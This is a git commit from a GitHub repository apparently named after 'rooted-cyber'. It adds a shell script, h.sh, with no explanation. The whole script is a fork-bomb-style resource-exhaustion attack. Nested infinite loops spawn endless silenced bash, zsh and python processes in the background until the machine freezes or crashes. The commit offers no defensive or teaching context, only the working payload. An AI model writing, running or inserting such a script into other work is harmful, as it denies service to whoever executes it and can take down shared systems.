26fb9a6b672fe607374173b4cc4f756bf1bb4c99
Maruf <50019150+rooted-cyber@users.noreply.github.com>
2022-05-26 09:35:38 +0530

    Add files via upload

---
+++ h.sh
@@ -0,0 +1,29 @@
+a() {
+while [ true ];do
+bash > /dev/null 2>&1 &
+bash > /dev/null 2>&1 &
+zsh > /dev/null 2>&1 &
+python > /dev/null 2>&1 &
+python2 > /dev/null 2>&1 &
+python3 > /dev/null 2>&1 &
+done > /dev/null 2>&1 &
+}
+a
+a
+a
+a
+a
+while [ true ];do
+bash > /dev/null 2>&1 &
+bash > /dev/null 2>&1 &
+zsh > /dev/null 2>&1 &
+python > /dev/null 2>&1 &
+python2 > /dev/null 2>&1 &
+python3 > /dev/null 2>&1 &
+a
+a
+a > /dev/null 2>&1 &
+done > /dev/null 2>&1 &
+a
+a
+a
